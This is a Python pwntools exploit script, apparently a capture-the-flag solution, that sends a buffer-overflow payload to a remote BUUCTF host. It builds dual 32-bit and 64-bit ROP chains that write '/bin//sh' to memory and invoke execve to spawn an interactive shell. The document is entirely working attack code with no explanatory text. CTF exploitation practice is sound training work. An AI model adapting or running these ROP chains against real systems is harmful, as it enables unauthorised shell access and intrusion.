from pwn import *
from struct import pack
r = remote("node2.buuoj.cn.wetolink.com", 28127)
def chain32():
	p = ''
	p += pack('<I', 0x0806e9cb) # pop edx ; ret
	p += pack('<I', 0x080d9060) # @ .data
	p += pack('<I', 0x080a8af6) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806e9cb) # pop edx ; ret
	p += pack('<I', 0x080d9064) # @ .data + 4
	p += pack('<I', 0x080a8af6) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806e9cb) # pop edx ; ret
	p += pack('<I', 0x080d9068) # @ .data + 8
	p += pack('<I', 0x08056040) # xor eax, eax ; ret
	p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080d9060) # @ .data
	p += pack('<I', 0x0806e9f2) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080d9068) # @ .data + 8
	p += pack('<I', 0x080d9060) # padding without overwrite ebx
	p += pack('<I', 0x0806e9cb) # pop edx ; ret
	p += pack('<I', 0x080d9068) # @ .data + 8
	p += pack('<I', 0x08056040) # xor eax, eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x080495a3) # int 0x80
	return p
def chain64():
	p = ''
	p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
	p += pack('<Q', 0x00000000006a10e0) # @ .data
	p += pack('<Q', 0x000000000043b97c) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
	p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
	p += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x00000000004005f6) # pop rdi ; ret
	p += pack('<Q', 0x00000000006a10e0) # @ .data
	p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
	p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
	p += pack('<Q', 0x000000000043b9d5) # pop rdx ; ret
	p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
	p += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000046713f) # syscall
	return p
if __name__ == '__main__':
	payload32 = chain32()
	payload64 = chain64()
	print hex(len(payload32))
	print hex(len(payload64))
	payload = 'a'*0x110+p32(0x80a8f69)+'a'*4+p64(0x4079d5)+payload32+'a'*(0xd8-len(payload32))+payload64
	r.recv()	
	r.send(payload)
	r.interactive()
